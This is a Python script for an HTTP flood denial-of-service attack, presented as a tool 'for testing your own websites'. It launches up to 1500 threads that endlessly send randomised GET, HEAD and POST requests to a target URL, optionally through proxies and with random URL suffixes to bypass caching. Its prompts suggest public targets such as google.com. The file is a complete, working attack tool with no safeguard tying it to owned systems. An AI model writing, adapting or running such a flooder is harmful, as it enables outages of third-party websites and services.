# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru
import threading
import http.client
import urllib.parse
import random
import sys
import string

# TODO вынести это в config.txt
referrer = ""
request_methods = ["GET", "HEAD", "POST"]
thread_limit = 1500
append_rand_string_to_url = False
min_timeout = 20
max_timeout = 30
# Global variables
user_agents = []  # in file 'useragents.txt'
proxies = []  # in file 'proxies.txt' if none - attack directly
url = []  # from file 'urls.txt' or enter manually
# Global parameters end


class Flooder(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            cur_url = urllib.parse.urlparse(random.choice(url))
            if len(proxies) == 0:  # setting direct connection here
                connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout, max_timeout))
                url_str = cur_url.path + cur_url.params + cur_url.query
            else:  # connect via random proxy
                connection = http.client.HTTPConnection(random.choice(proxies))
                url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
            while True:
                cur_header = {
                    "User-agent": random.choice(user_agents),
                    "Referrer": referrer,
                    "Accept-Encoding": "gzip,deflate"
                }
                if not append_rand_string_to_url:
                    connection.request(method=random.choice(request_methods), url=url_str, headers=cur_header)
                else:
                    randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                    connection.request(method=random.choice(request_methods), url=url_str + randstr, headers=cur_header)
        except:
            sys.exit()
            pass


class SettingsReader():
    def __init__(self):
        self.read_useragents()
        self.read_proxies()
        self.read_config()
        self.read_urls()

    @staticmethod
    def read_file_to_array(file_desc):
        file_desc.seek(0)
        array = [line.strip() for line in file_desc]
        return array

    def read_useragents(self):
        global user_agents
        file = open("useragents.txt", "a+")
        user_agents = self.read_file_to_array(file)
        if len(user_agents) == 0:
            def_user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1797.2 Safari/537.36'
            user_agents.append(
                def_user_agent)
            file.write(
                def_user_agent)
        file.close()

    def read_urls(self):
        global url, target
        file = open("urls.txt", "a+")
        url = self.read_file_to_array(file)
        if len(url) == 0:
            print('Enter target url or IP ( e.g. "http://google.com/" or "http://195.208.0.133/"):')
            target = input()
            url.append(target)
        file.close()

    def read_proxies(self):
        global proxies
        file = open("proxies.txt", "a+")
        proxies = self.read_file_to_array(file)
        file.close()

    def read_config(self):
        # TODO
        pass


SettingsReader()

target = urllib.parse.urlparse(random.choice(url))
print(str(len(user_agents))+' user agents detected')
print(str(len(url))+' urls detected')
print(str(len(proxies))+' proxies detected')
print(str(thread_limit) + ' threads')
print("Flooding %s" % target.netloc)

while True:
    if threading.active_count() <= thread_limit:
        Flooder().start()
